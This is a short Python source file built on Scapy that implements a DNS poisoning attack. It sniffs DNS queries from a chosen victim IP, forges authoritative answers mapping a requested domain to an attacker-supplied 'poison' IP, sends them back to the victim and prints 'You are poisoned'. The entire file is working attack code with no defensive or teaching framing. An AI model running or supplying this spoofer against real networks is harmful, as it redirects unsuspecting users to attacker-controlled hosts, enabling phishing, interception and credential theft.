import sys
import time
from scapy.all import *

class DnsPoisoning:
    interface = 0
    def __init__(self, intFace):
        self.interface = intFace

    def doPoison(self, ipVictim, url, ipPoison):

        def makeFakeResponse(pkt, ipVictim, url, ipPoison, interface):
            # check if the packet (is a DNS packet) AND (comes from the target)
            if pkt.haslayer(DNS) and ((ipVictim is None) or (pkt[IP].src == ipVictim)):
                # check if the dns packet (is a request) AND (concerns the target URL)
                if (pkt[DNS].qr == 0) and ((url is None) or (pkt[DNS].qd.qname.decode('UTF-8') == url)):
                    # for a response revert destination and source
                    fakeIP = IP(src=pkt[IP].dst, dst=pkt[IP].src)
                    fakeUDP = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                    # fake query pointing the requested URL to the poison IP
                    fakeDNSRR = DNSRR(rrname=pkt[DNS].qd.qname, rdata=ipPoison)
                    # fake DNS response
                    fakeDNS = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=fakeDNSRR)
                    # combine into complete packet
                    poisonPacket = fakeIP / fakeUDP / fakeDNS
                    # send the poison packet to the victim
                    send(poisonPacket, verbose=0, iface=interface)
                    print("Fake packet sent")

        sniff(count=10,  # capture 1 packet
            store=0,  # do not store it
            prn=lambda pkt: makeFakeResponse(pkt, ipVictim, url, ipPoison, self.interface),
            iface=self.interface)
        
        print("You are poisoned")